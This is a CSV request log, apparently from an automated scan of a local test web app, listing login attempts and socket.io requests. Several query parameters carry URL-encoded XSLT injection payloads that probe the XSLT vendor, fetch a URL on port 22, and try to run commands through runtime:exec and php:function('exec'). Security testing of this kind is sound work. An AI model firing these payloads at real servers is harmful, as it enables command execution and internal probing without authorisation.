Id,Req. Timestamp,Resp. Timestamp,Método,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
80925,Tue Jun 02 01:36:00 WEST 2020,Tue Jun 02 01:36:00 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,517,332,26
80928,Tue Jun 02 01:36:00 WEST 2020,Tue Jun 02 01:36:01 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=N9n_j7M&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,340,153,34
80931,Tue Jun 02 01:36:01 WEST 2020,Tue Jun 02 01:36:01 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=polling&t=N9n_j7M&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,229,153,34
80932,Tue Jun 02 01:36:00 WEST 2020,Tue Jun 02 01:36:01 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,571,332,26
80935,Tue Jun 02 01:36:01 WEST 2020,Tue Jun 02 01:36:01 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F10.0.2.2%3A22%27%29%22%2F%3E&transport=polling&t=N9n_j7M&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,252,153,34
80938,Tue Jun 02 01:36:01 WEST 2020,Tue Jun 02 01:36:01 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&transport=polling&t=N9n_j7M&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,374,153,34
80939,Tue Jun 02 01:36:01 WEST 2020,Tue Jun 02 01:36:01 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,630,332,26
80942,Tue Jun 02 01:36:01 WEST 2020,Tue Jun 02 01:36:02 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&transport=polling&t=N9n_j7M&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,265,153,34
80945,Tue Jun 02 01:36:02 WEST 2020,Tue Jun 02 01:36:02 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3C&t=N9n_j7M&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,299,153,40
80946,Tue Jun 02 01:36:01 WEST 2020,Tue Jun 02 01:36:02 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,615,332,26
